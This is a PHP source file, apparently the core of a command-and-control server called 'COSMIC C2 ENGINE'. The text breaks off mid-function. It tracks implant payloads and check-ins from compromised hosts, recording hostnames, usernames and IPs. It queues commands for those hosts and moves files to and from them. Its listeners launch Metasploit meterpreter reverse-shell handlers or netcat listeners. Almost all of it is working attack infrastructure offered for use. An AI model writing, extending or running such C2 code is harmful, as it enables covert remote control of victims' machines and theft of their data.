<?php
/**
 * COSMIC C2 ENGINE v8.0 – INDUSTRIAL‑GRADE
 * Enhanced with advanced tasks, priority, recurring, tags, traffic stats, and more.
 */
class C2Engine {
    private $db;
    private $dbPath;
    private $encryptionKey = 'COSMIC-C2-ENCRYPTION-KEY-2026';
    private $authToken = null;
    private $logger;

    public function __construct($config = []) {
        $this->dbPath = dirname(__DIR__, 2) . '/data/c2/c2.db';
        $this->authToken = getenv('C2_API_KEY') ?: getenv('C2_API_KEY');
        $this->initLogger();
        $this->connect();
        $this->migrate();
        $this->optimize();
    }

    private function initLogger() {
        $logDir = dirname(__DIR__, 2) . '/data/logs/';
        if (!is_dir($logDir)) mkdir($logDir, 0755, true);
        $logFile = $logDir . '/c2.log';
        $this->logger = function($level, $message, $context = []) use ($logFile) {
            $entry = sprintf("[%s] %s: %s %s\n",
                date('Y-m-d H:i:s'),
                strtoupper($level),
                $message,
                json_encode($context)
            );
            file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
        };
    }

    private function log($level, $message, $context = []) {
        if ($this->logger) {
            ($this->logger)($level, $message, $context);
        }
    }

    private function connect() {
        try {
            $this->db = new SQLite3($this->dbPath);
            $this->db->busyTimeout(5000);
            $this->db->exec('PRAGMA foreign_keys = ON;');
            $this->db->exec('PRAGMA journal_mode = WAL;');
        } catch (Exception $e) {
            $this->log('ERROR', 'Database connection failed', ['error' => $e->getMessage()]);
            throw new Exception('C2 Database connection failed.');
        }
    }

    private function migrate() {
        // Payloads table
        $this->db->exec("CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT UNIQUE NOT NULL,
            name TEXT,
            type TEXT,
            platform TEXT,
            lhost TEXT,
            lport INTEGER,
            filename TEXT,
            hash_sha256 TEXT,
            created_at INTEGER,
            last_seen INTEGER,
            expires_at INTEGER,
            heartbeat_interval INTEGER DEFAULT 60,
            jitter INTEGER DEFAULT 30,
            encryption_enabled INTEGER DEFAULT 0,
            group_name TEXT DEFAULT '',
            tags TEXT DEFAULT '',
            note TEXT DEFAULT '',
            status TEXT DEFAULT 'active'
        )");

        // Beacons table
        $this->db->exec("CREATE TABLE IF NOT EXISTS beacons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload_uuid TEXT NOT NULL,
            ip TEXT,
            external_ip TEXT DEFAULT '',
            country TEXT DEFAULT '',
            user_agent TEXT,
            hostname TEXT,
            username TEXT,
            os_info TEXT,
            pid INTEGER,
            architecture TEXT,
            beacon_time INTEGER,
            encrypted INTEGER DEFAULT 0
        )");

        // Tasks table with new columns
        $this->db->exec("CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload_uuid TEXT NOT NULL,
            command TEXT NOT NULL,
            type TEXT DEFAULT 'command',
            priority INTEGER DEFAULT 5,
            recurring TEXT DEFAULT '',
            tags TEXT DEFAULT '',
            status TEXT DEFAULT 'pending',
            created_at INTEGER,
            expires_at INTEGER,
            retries INTEGER DEFAULT 0,
            max_retries INTEGER DEFAULT 3,
            executed_at INTEGER,
            result TEXT
        )");

        // Listeners table
        $this->db->exec("CREATE TABLE IF NOT EXISTS listeners (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            protocol TEXT DEFAULT 'tcp',
            lhost TEXT NOT NULL,
            lport INTEGER NOT NULL,
            payload_type TEXT DEFAULT 'generic/shell_reverse_tcp',
            pid INTEGER,
            status TEXT DEFAULT 'stopped',
            auto_restart INTEGER DEFAULT 0,
            log_file TEXT DEFAULT '',
            last_output TEXT DEFAULT '',
            created_at INTEGER,
            updated_at INTEGER,
            last_heartbeat INTEGER
        )");

        // Files table
        $this->db->exec("CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload_uuid TEXT NOT NULL,
            filename TEXT,
            data BLOB,
            direction TEXT,
            status TEXT DEFAULT 'pending',
            created_at INTEGER,
            completed_at INTEGER,
            size INTEGER,
            hash_sha256 TEXT
        )");

        // Users table
        $this->db->exec("CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'operator',
            created_at INTEGER,
            last_login INTEGER
        )");

        // C2 stats table
        $this->db->exec("CREATE TABLE IF NOT EXISTS c2_stats (
            key TEXT PRIMARY KEY,
            value TEXT,
            updated_at INTEGER
        )");

        $this->initStat('total_payloads', '0');
        $this->initStat('total_beacons', '0');
        $this->initStat('total_tasks', '0');
        $this->initStat('total_files', '0');
    }

    private function optimize() {
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_payloads_uuid ON payloads(uuid)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_payloads_status ON payloads(status)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_beacons_payload_uuid ON beacons(payload_uuid)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_beacons_time ON beacons(beacon_time)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_tasks_payload_uuid ON tasks(payload_uuid)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_tasks_expires ON tasks(expires_at)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_files_payload_uuid ON files(payload_uuid)");
    }

    private function initStat($key, $default) {
        $stmt = $this->db->prepare("INSERT OR IGNORE INTO c2_stats (key, value, updated_at) VALUES (:key, :val, :time)");
        if (!$stmt) return;
        $stmt->bindValue(':key', $key, SQLITE3_TEXT);
        $stmt->bindValue(':val', $default, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->execute();
    }

    private function checkAuth($token = null) {
        if ($this->authToken === null) return true;
        return $token === $this->authToken;
    }

    // ========== USER AUTHENTICATION ==========
    public function authenticate($username, $password) {
        $stmt = $this->db->prepare("SELECT * FROM users WHERE username = :user");
        $stmt->bindValue(':user', $username, SQLITE3_TEXT);
        $res = $stmt->execute();
        $user = $res->fetchArray(SQLITE3_ASSOC);
        if ($user && password_verify($password, $user['password_hash'])) {
            $stmt = $this->db->prepare("UPDATE users SET last_login = :time WHERE id = :id");
            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
            $stmt->bindValue(':id', $user['id'], SQLITE3_INTEGER);
            $stmt->execute();
            return $user;
        }
        return false;
    }

    // ========== PAYLOAD MANAGEMENT ==========
    public function registerPayload($data, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $uuid = $data['uuid'] ?? $this->generateUUID();
        $expires = isset($data['expires_in']) ? time() + $data['expires_in'] : null;
        $stmt = $this->db->prepare("
            INSERT INTO payloads
            (uuid, name, type, platform, lhost, lport, filename, hash_sha256, created_at, expires_at, status,
             heartbeat_interval, jitter, encryption_enabled, group_name, tags, note)
            VALUES (:uuid, :name, :type, :platform, :lhost, :lport, :filename, :hash, :created, :expires, :status,
                    :heartbeat, :jitter, :encrypt, :group, :tags, :note)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
        $stmt->bindValue(':name', $data['name'] ?? 'Unnamed', SQLITE3_TEXT);
        $stmt->bindValue(':type', $data['type'] ?? 'unknown', SQLITE3_TEXT);
        $stmt->bindValue(':platform', $data['platform'] ?? 'generic', SQLITE3_TEXT);
        $stmt->bindValue(':lhost', $data['lhost'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':lport', $data['lport'] ?? 0, SQLITE3_INTEGER);
        $stmt->bindValue(':filename', $data['filename'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':hash', $data['hash'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':created', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':expires', $expires, SQLITE3_INTEGER);
        $stmt->bindValue(':status', $data['status'] ?? 'active', SQLITE3_TEXT);
        $stmt->bindValue(':heartbeat', $data['heartbeat'] ?? 60, SQLITE3_INTEGER);
        $stmt->bindValue(':jitter', $data['jitter'] ?? 30, SQLITE3_INTEGER);
        $stmt->bindValue(':encrypt', $data['encryption_enabled'] ?? 0, SQLITE3_INTEGER);
        $stmt->bindValue(':group', $data['group'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':tags', $data['tags'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':note', $data['note'] ?? '', SQLITE3_TEXT);
        $stmt->execute();
        $this->updateStat('total_payloads', '+1');
        return $uuid;
    }

    public function getPayloads($filters = [], $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $sql = "SELECT * FROM payloads";
        $where = [];
        $params = [];
        foreach ($filters as $k => $v) {
            $where[] = "$k = :$k";
            $params[":$k"] = $v;
        }
        if (!isset($filters['expires_at'])) {
            $where[] = "(expires_at IS NULL OR expires_at > :now)";
            $params[':now'] = time();
        }
        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
        $sql .= " ORDER BY created_at DESC";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val, is_int($val) ? SQLITE3_INTEGER : SQLITE3_TEXT);
        }
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    public function getActivePayloads($authToken = null) {
        return $this->getPayloads(['status' => 'active'], $authToken);
    }

    public function getPayload($uuid, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("SELECT * FROM payloads WHERE uuid = :uuid");
        if (!$stmt) return null;
        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }

    // ========== BEACON MANAGEMENT ==========
    public function beacon($payloadUuid, $info, $authToken = null) {
        $payload = $this->getPayload($payloadUuid);
        if (!$payload || $payload['status'] !== 'active') {
            return ['error' => 'Payload not active'];
        }
        if ($payload['expires_at'] && $payload['expires_at'] < time()) {
            $this->updatePayload($payloadUuid, ['status' => 'expired']);
            return ['error' => 'Payload expired'];
        }

        $stmt = $this->db->prepare("UPDATE payloads SET last_seen = :time WHERE uuid = :uuid");
        if (!$stmt) return [];
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->execute();

        $encrypted = isset($info['encrypted']) ? (int)$info['encrypted'] : 0;

        $stmt = $this->db->prepare("
            INSERT INTO beacons
            (payload_uuid, ip, external_ip, country, user_agent, hostname, username, os_info, pid, architecture, beacon_time, encrypted)
            VALUES (:uuid, :ip, :ext_ip, :country, :ua, :hostname, :username, :os, :pid, :arch, :time, :enc)
        ");
        if (!$stmt) return [];
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':ip', $info['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':ext_ip', $info['external_ip'] ?? $this->getExternalIP(), SQLITE3_TEXT);
        $stmt->bindValue(':country', $info['country'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':ua', $info['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':hostname', $info['hostname'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':username', $info['username'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':os', $info['os_info'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':pid', $info['pid'] ?? 0, SQLITE3_INTEGER);
        $stmt->bindValue(':arch', $info['architecture'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':enc', $encrypted, SQLITE3_INTEGER);
        $stmt->execute();

        $this->updateStat('total_beacons', '+1');
        $tasks = $this->getPendingTasks($payloadUuid);

        $interval = $payload['heartbeat_interval'] + rand(-$payload['jitter'], $payload['jitter']);
        if ($interval < 10) $interval = 10;

        return [
            'status' => 'ok',
            'tasks' => $tasks,
            'next_interval' => $interval,
            'server_time' => time()
        ];
    }

    public function getBeacons($payloadUuid = null, $limit = 50, $offset = 0, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $sql = "SELECT * FROM beacons";
        $params = [];
        if ($payloadUuid) {
            $sql .= " WHERE payload_uuid = :uuid";
            $params[':uuid'] = $payloadUuid;
        }
        $sql .= " ORDER BY beacon_time DESC LIMIT :limit OFFSET :offset";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        if ($payloadUuid) $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
        $stmt->bindValue(':offset', $offset, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    public function getBeaconCount($payloadUuid = null) {
        $sql = "SELECT COUNT(*) FROM beacons";
        $params = [];
        if ($payloadUuid) {
            $sql .= " WHERE payload_uuid = :uuid";
            $params[':uuid'] = $payloadUuid;
        }
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return 0;
        if ($payloadUuid) $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_NUM)[0] ?? 0;
    }

    // ========== TASK MANAGEMENT ==========
    public function addTask($payloadUuid, $command, $type = 'command', $expiresIn = 3600, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        return $this->addAdvancedTask($payloadUuid, $command, $type, 5, '', '', $expiresIn, $authToken);
    }

    public function addAdvancedTask($payloadUuid, $command, $type = 'command', $priority = 5, $recurring = '', $tags = '', $expiresIn = 3600, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("
            INSERT INTO tasks (payload_uuid, command, type, priority, recurring, tags, status, created_at, expires_at)
            VALUES (:uuid, :cmd, :type, :priority, :recurring, :tags, 'pending', :time, :expires)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':cmd', $command, SQLITE3_TEXT);
        $stmt->bindValue(':type', $type, SQLITE3_TEXT);
        $stmt->bindValue(':priority', $priority, SQLITE3_INTEGER);
        $stmt->bindValue(':recurring', $recurring, SQLITE3_TEXT);
        $stmt->bindValue(':tags', $tags, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':expires', time() + $expiresIn, SQLITE3_INTEGER);
        $stmt->execute();
        $taskId = $this->db->lastInsertRowID();
        $this->updateStat('total_tasks', '+1');
        return $taskId;
    }

    public function getPendingTasks($payloadUuid) {
        $stmt = $this->db->prepare("
            SELECT id, command, type, priority, recurring, tags FROM tasks
            WHERE payload_uuid = :uuid
              AND status = 'pending'
              AND (expires_at IS NULL OR expires_at > :now)
            ORDER BY priority DESC, created_at ASC
        ");
        if (!$stmt) return [];
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':now', time(), SQLITE3_INTEGER);
        $res = $stmt->execute();
        $tasks = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $tasks[] = $row;
        return $tasks;
    }

    public function getAdvancedTasks($filters = [], $limit = 100, $offset = 0, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $sql = "SELECT * FROM tasks";
        $where = [];
        $params = [];
        if (isset($filters['payload_uuid'])) {
            $where[] = "payload_uuid = :uuid";
            $params[':uuid'] = $filters['payload_uuid'];
        }
        if (isset($filters['status'])) {
            $where[] = "status = :status";
            $params[':status'] = $filters['status'];
        }
        if (isset($filters['type'])) {
            $where[] = "type = :type";
            $params[':type'] = $filters['type'];
        }
        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
        $sql .= " ORDER BY priority DESC, created_at DESC LIMIT :limit OFFSET :offset";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val, SQLITE3_TEXT);
        }
        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
        $stmt->bindValue(':offset', $offset, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    public function completeTask($taskId, $result, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("
            UPDATE tasks SET status = 'completed', executed_at = :exec, result = :result
            WHERE id = :id
        ");
        if (!$stmt) return;
        $stmt->bindValue(':exec', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':result', $result, SQLITE3_TEXT);
        $stmt->bindValue(':id', $taskId, SQLITE3_INTEGER);
        $stmt->execute();
    }

    public function getTasks($payloadUuid = null, $status = null, $limit = 100, $offset = 0, $authToken = null) {
        $filters = [];
        if ($payloadUuid) $filters['payload_uuid'] = $payloadUuid;
        if ($status) $filters['status'] = $status;
        return $this->getAdvancedTasks($filters, $limit, $offset, $authToken);
    }

    public function getTaskCount($payloadUuid = null, $status = null) {
        $sql = "SELECT COUNT(*) FROM tasks";
        $where = [];
        $params = [];
        if ($payloadUuid) {
            $where[] = "payload_uuid = :uuid";
            $params[':uuid'] = $payloadUuid;
        }
        if ($status) {
            $where[] = "status = :status";
            $params[':status'] = $status;
        }
        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return 0;
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val, SQLITE3_TEXT);
        }
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_NUM)[0] ?? 0;
    }

    public function deleteTask($taskId, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("DELETE FROM tasks WHERE id = :id");
        if (!$stmt) return;
        $stmt->bindValue(':id', $taskId, SQLITE3_INTEGER);
        $stmt->execute();
        $this->updateStat('total_tasks', '-1');
    }

    public function cleanupExpiredTasks($authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("DELETE FROM tasks WHERE status = 'pending' AND expires_at < :now");
        $stmt->bindValue(':now', time(), SQLITE3_INTEGER);
        $stmt->execute();
        $count = $this->db->changes();
        $this->log('INFO', 'Cleaned up expired tasks', ['count' => $count]);
        return $count;
    }

    // ========== TRAFFIC STATISTICS ==========
    public function getTrafficStats($days = 7) {
        $stats = [];
        // Beacons per day
        $stmt = $this->db->prepare("
            SELECT date(beacon_time, 'unixepoch') as day, COUNT(*) as count
            FROM beacons
            WHERE beacon_time > :since
            GROUP BY day
            ORDER BY day
        ");
        $stmt->bindValue(':since', time() - ($days * 86400), SQLITE3_INTEGER);
        $res = $stmt->execute();
        $stats['beacons_per_day'] = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $stats['beacons_per_day'][] = $row;

        // Top payloads by beacon count
        $stmt = $this->db->prepare("
            SELECT payload_uuid, COUNT(*) as count
            FROM beacons
            WHERE beacon_time > :since
            GROUP BY payload_uuid
            ORDER BY count DESC
            LIMIT 10
        ");
        $stmt->bindValue(':since', time() - ($days * 86400), SQLITE3_INTEGER);
        $res = $stmt->execute();
        $stats['top_payloads'] = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $stats['top_payloads'][] = $row;

        // Beacons by country
        $stmt = $this->db->prepare("
            SELECT country, COUNT(*) as count
            FROM beacons
            WHERE beacon_time > :since AND country != ''
            GROUP BY country
            ORDER BY count DESC
        ");
        $stmt->bindValue(':since', time() - ($days * 86400), SQLITE3_INTEGER);
        $res = $stmt->execute();
        $stats['beacons_by_country'] = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $stats['beacons_by_country'][] = $row;

        return $stats;
    }

    // ========== FILE EXCHANGE ==========
    public function uploadFile($payloadUuid, $filename, $data, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $hash = hash('sha256', $data);
        $size = strlen($data);
        $stmt = $this->db->prepare("
            INSERT INTO files (payload_uuid, filename, data, direction, status, created_at, size, hash_sha256)
            VALUES (:uuid, :name, :data, 'upload', 'pending', :time, :size, :hash)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':name', $filename, SQLITE3_TEXT);
        $stmt->bindValue(':data', $data, SQLITE3_BLOB);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':size', $size, SQLITE3_INTEGER);
        $stmt->bindValue(':hash', $hash, SQLITE3_TEXT);
        $stmt->execute();
        $fileId = $this->db->lastInsertRowID();
        $this->updateStat('total_files', '+1');
        return $fileId;
    }

    public function downloadFile($payloadUuid, $fileId, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("SELECT * FROM files WHERE id = :id AND payload_uuid = :uuid AND direction = 'download'");
        $stmt->bindValue(':id', $fileId, SQLITE3_INTEGER);
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $res = $stmt->execute();
        $file = $res->fetchArray(SQLITE3_ASSOC);
        if (!$file) return false;
        $stmt = $this->db->prepare("UPDATE files SET status = 'completed', completed_at = :time WHERE id = :id");
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':id', $fileId, SQLITE3_INTEGER);
        $stmt->execute();
        return $file;
    }

    public function getFiles($payloadUuid = null, $direction = null, $limit = 100, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $sql = "SELECT id, payload_uuid, filename, direction, status, created_at, completed_at, size, hash_sha256 FROM files";
        $where = [];
        $params = [];
        if ($payloadUuid) {
            $where[] = "payload_uuid = :uuid";
            $params[':uuid'] = $payloadUuid;
        }
        if ($direction) {
            $where[] = "direction = :dir";
            $params[':dir'] = $direction;
        }
        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
        $sql .= " ORDER BY created_at DESC LIMIT :limit";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val, SQLITE3_TEXT);
        }
        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    // ========== LISTENER MANAGEMENT ==========
    public function createListener($name, $lhost, $lport, $protocol = 'tcp', $payload_type = 'generic/shell_reverse_tcp', $auto_restart = 0, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("
            INSERT INTO listeners (name, lhost, lport, protocol, payload_type, status, auto_restart, created_at, updated_at)
            VALUES (:name, :host, :port, :proto, :ptype, 'stopped', :restart, :time, :time)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
        $stmt->bindValue(':host', $lhost, SQLITE3_TEXT);
        $stmt->bindValue(':port', $lport, SQLITE3_INTEGER);
        $stmt->bindValue(':proto', $protocol, SQLITE3_TEXT);
        $stmt->bindValue(':ptype', $payload_type, SQLITE3_TEXT);
        $stmt->bindValue(':restart', $auto_restart, SQLITE3_INTEGER);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $result = $stmt->execute();
        if (!$result) return false;
        return $this->db->lastInsertRowID();
    }

    public function getListeners($authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $res = $this->db->query("SELECT * FROM listeners ORDER BY created_at DESC");
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    public function startListener($id, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("SELECT * FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $listener = $res->fetchArray(SQLITE3_ASSOC);
        if (!$listener) return false;

        $cmd = [];
        $logFile = sys_get_temp_dir() . '/c2_listener_' . $id . '.log';
        switch ($listener['payload_type']) {
            case 'windows/meterpreter/reverse_tcp':
            case 'linux/x86/meterpreter/reverse_tcp':
            case 'android/meterpreter/reverse_tcp':
            case 'osx/x64/meterpreter/reverse_tcp':
            case 'generic/shell_reverse_tcp':
                $rcFile = sys_get_temp_dir() . '/c2_listener_' . $id . '.rc';
                $rcContent = "use exploit/multi/handler\n";
                $rcContent .= "set PAYLOAD " . $listener['payload_type'] . "\n";
                $rcContent .= "set LHOST " . $listener['lhost'] . "\n";
                $rcContent .= "set LPORT " . $listener['lport'] . "\n";
                $rcContent .= "set ExitOnSession false\n";
                $rcContent .= "exploit -j -z\n";
                file_put_contents($rcFile, $rcContent);
                $cmd = ['msfconsole', '-q', '-r', $rcFile];
                break;
            case 'tcp_raw':
                $cmd = ['nc', '-lvnp', $listener['lport']];
                break;
            default:
                return false;
        }

        $cmdStr = implode(' ', array_map('escapeshellarg', $cmd)) . ' >> ' . escapeshellarg($logFile) . ' 2>&1 & echo $!';
        $output = shell_exec($cmdStr);
        $pid = trim($output);
        if (!is_numeric($pid)) {
            $this->log('ERROR', 'Failed to start listener', ['cmd' => $cmdStr, 'output' => $output]);
            return false;
        }

        $stmt = $this->db->prepare("UPDATE listeners SET status = 'running', pid = :pid, log_file = :log, updated_at = :time, last_heartbeat = :time WHERE id = :id");
        $stmt->bindValue(':pid', $pid, SQLITE3_INTEGER);
        $stmt->bindValue(':log', $logFile, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();

        $this->log('INFO', 'Listener started', ['id' => $id, 'pid' => $pid]);
        return $pid;
    }

    public function stopListener($id, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("SELECT pid FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $listener = $res->fetchArray(SQLITE3_ASSOC);
        if (!$listener || !$listener['pid']) return false;

        if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
            $cmdline = @file_get_contents("/proc/{$listener['pid']}/cmdline");
            if ($cmdline && strpos($cmdline, 'msfconsole') === false && strpos($cmdline, 'nc') === false) {
                $this->log('WARNING', 'PID does not match expected command', ['pid' => $listener['pid']]);
            }
        }

        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            exec("taskkill /PID " . $listener['pid'] . " /F");
        } else {
            exec("kill -9 " . $listener['pid']);
        }

        $stmt = $this->db->prepare("UPDATE listeners SET status = 'stopped', pid = NULL, updated_at = :time WHERE id = :id");
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();

        $this->log('INFO', 'Listener stopped', ['id' => $id]);
        return true;
    }

    public function deleteListener($id, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $this->stopListener($id, $authToken);
        $stmt = $this->db->prepare("DELETE FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();
        return true;
    }

    public function getListenerLog($id, $lines = 50, $authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stmt = $this->db->prepare("SELECT log_file FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $listener = $res->fetchArray(SQLITE3_ASSOC);
        if (!$listener || !$listener['log_file'] || !file_exists($listener['log_file'])) {
            return "No log file found.";
        }
        $log = file($listener['log_file']);
        if (!$log) return "Log is empty.";
        $lastLines = array_slice($log, -$lines);
        return implode('', $lastLines);
    }

    public function monitorListeners($authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $listeners = $this->getListeners();
        foreach ($listeners as $listener) {
            if ($listener['status'] !== 'running') continue;
            $pid = $listener['pid'];
            if (!$pid) continue;
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $output = shell_exec("tasklist /FI \"PID eq $pid\"");
                $alive = strpos($output, (string)$pid) !== false;
            } else {
                $alive = file_exists("/proc/$pid");
            }
            if (!$alive) {
                $this->log('WARNING', 'Listener crashed', ['id' => $listener['id'], 'pid' => $pid]);
                $stmt = $this->db->prepare("UPDATE listeners SET status = 'stopped', pid = NULL WHERE id = :id");
                $stmt->bindValue(':id', $listener['id'], SQLITE3_INTEGER);
                $stmt->execute();
                if ($listener['auto_restart']) {
                    $this->log('INFO', 'Auto-restarting listener', ['id' => $listener['id']]);
                    $this->startListener($listener['id']);
                }
            } else {
                $stmt = $this->db->prepare("UPDATE listeners SET last_heartbeat = :time WHERE id = :id");
                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
                $stmt->bindValue(':id', $listener['id'], SQLITE3_INTEGER);
                $stmt->execute();
            }
        }
    }

    // ========== STATISTICS ==========
    public function getStats($authToken = null) {
        if (!$this->checkAuth($authToken)) throw new Exception('Unauthorized');
        $stats = [];
